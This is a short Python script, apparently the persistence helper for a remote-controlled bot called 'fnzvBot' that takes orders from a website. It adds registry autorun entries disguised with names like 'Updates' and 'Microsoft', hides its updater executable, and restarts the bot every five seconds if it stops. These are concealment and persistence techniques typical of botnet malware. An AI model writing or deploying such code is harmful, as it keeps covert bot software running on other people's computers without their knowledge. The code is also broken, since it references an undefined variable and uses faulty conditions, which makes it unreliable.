import os ,time
#This code allow the fnzvBot to keep working after crashing on a DDOS attack or any other issue.. so the bot keeps connecting to the site and listens for new orders
#Every 5 seconds checks if the bot is alive ..if not start it again
#the updater must be on the same folder*... the updater is installed the first time the bot is clicked


os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Updates" /t REG_SZ /F /D """'+os.getcwd()+'\\updoto.exe"""') 
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\updoto.exe"""')
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\updoto.exe"""')

#checks if the fnzvBot is open or not... must be the same name of the .exe bot file
exeName="fnzvBOTv3.exe"
otherExe="remote.exe" ## another exe to check 
os.popen("attrib +h updoto.exe")
while True:
    processi=os.popen("tasklist").read()
    if exeName and nkey in processi :
        time.sleep(5)
    elif exeName and nkey not in processi :
        os.popen("start "+exeName)
        time.sleep(5)

